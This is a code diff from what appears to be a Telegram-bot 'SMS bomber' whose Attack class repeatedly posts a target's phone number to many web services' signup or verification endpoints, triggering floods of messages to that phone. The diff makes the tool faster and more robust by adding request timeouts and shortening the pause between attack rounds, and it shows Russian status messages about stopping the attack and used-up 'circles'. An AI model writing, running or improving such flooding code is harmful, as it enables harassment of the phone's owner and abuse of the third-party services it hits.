@@ -78,14 +78,14 @@ class Attack:
                     if "data" in v.keys():
                         url = k # v["url"] % decode_host(k)
                         data = (v["data"] % self.phone).replace("'", "\"")
-                        await self.session.post(url=url, data=loads(data), headers=self.headers)
+                        await self.session.post(url=url, data=loads(data), headers=self.headers, timeout=2)
                     elif "json" in v.keys():
                         url = k # v["url"] % decode_host(k)
                         json = (v["json"] % self.phone).replace("'", "\"")
-                        await self.session.post(url=url, json=loads(json), headers=self.headers)
+                        await self.session.post(url=url, json=loads(json), headers=self.headers, timeout=2)
                     else:
                         url = k % self.phone # v["url"] % (decode_host(k), self.phone,)  # Url
-                        await self.session.post(url=url)
+                        await self.session.post(url=url, timeout=2)
                 except (ConnectionError, ReadTimeout, UnicodeEncodeError, SSLError):
                     pass
 
@@ -97,15 +97,16 @@ class Attack:
                     return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
                 self.state_circles -= 1
 
-            await sleep(5)  # Time-out
+            await sleep(3)  # Time-out
 
     async def stop(self):
         """Stop attack"""
 
+        self.process_status = False       # Change process status
+
         # Update count cirlces (handle stoping)
         await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
 
-        self.process_status = False       # Change process status
         await self.session.close()
 
     async def proxy_auth(self, ip, port, username, password):
